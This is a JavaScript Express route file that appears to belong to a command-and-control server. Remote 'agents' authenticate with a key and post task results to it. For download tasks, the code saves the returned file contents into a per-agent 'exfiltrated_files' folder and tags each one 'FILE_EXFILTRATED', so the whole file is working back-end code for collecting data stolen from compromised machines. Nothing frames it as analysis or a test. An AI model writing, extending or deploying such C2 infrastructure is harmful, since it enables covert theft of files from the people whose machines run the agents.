const express = require('express');
const router = express.Router();
const { verifyAgentKey } = require('../middleware/agentAuth');
const Result = require('../models/result');
const Task = require('../models/task');

const path = require('path');
const fs = require('fs');

/**
 * POST /api/result
 * Agent submits task execution result
 * Auth: Agent API key
 */
router.post('/', verifyAgentKey, (req, res) => {
  try {
    const agentId = req.agentId;
    const { task_id, output, error, status } = req.body;

    if (!task_id) {
      return res.status(400).json({ error: 'task_id is required' });
    }

    let finalOutput = typeof output === 'string' ? output : JSON.stringify(output || '');

    // Check if task is a download task and auto-persist file to exfiltrated_files
    const task = Task.getById(task_id);
    if (task && (task.type === 'download' || task.type === 'download_url') && finalOutput && !error) {
      if (!finalOutput.startsWith('FILE_EXFILTRATED:')) {
        try {
          const EXFIL_DIR = path.join(__dirname, '../../exfiltrated_files');
          const agentDir = path.join(EXFIL_DIR, agentId);
          if (!fs.existsSync(agentDir)) fs.mkdirSync(agentDir, { recursive: true });

          let payloadObj = {};
          try { payloadObj = typeof task.payload === 'string' ? JSON.parse(task.payload) : (task.payload || {}); } catch(e) {}
          const targetPath = payloadObj.path || payloadObj.url || 'file.bin';
          const filename = path.basename(targetPath).replace(/[^a-z0-9._-]/gi, '_') || 'file.bin';

          const savePath = path.join(agentDir, `${Date.now()}_${filename}`);
          fs.writeFileSync(savePath, finalOutput, 'utf8');
          finalOutput = `FILE_EXFILTRATED:${savePath}`;
          console.log(`[EXFIL] Auto-persisted download result for ${agentId.slice(0, 8)}... -> ${savePath}`);
        } catch (exErr) {
          console.error('[EXFIL] Auto-persist error:', exErr.message);
        }
      }
    }

    // Store the result
    const result = Result.create({
      task_id,
      agent_id: agentId,
      output: finalOutput,
      error,
      status: status || (error ? 'error' : 'success')
    });

    // Update task status
    if (error || status === 'error') {
      Task.fail(task_id);
    } else {
      Task.complete(task_id);
    }

    console.log(`[RESULT] Agent ${agentId.slice(0, 8)}... -> Task ${task_id.slice(0, 8)}... : ${result.status}`);

    res.json({ ok: true, result_id: result.id });
  } catch (err) {
    console.error('[RESULT] Error:', err.message);
    res.status(500).json({ error: 'Result submission failed' });
  }
});

module.exports = router;
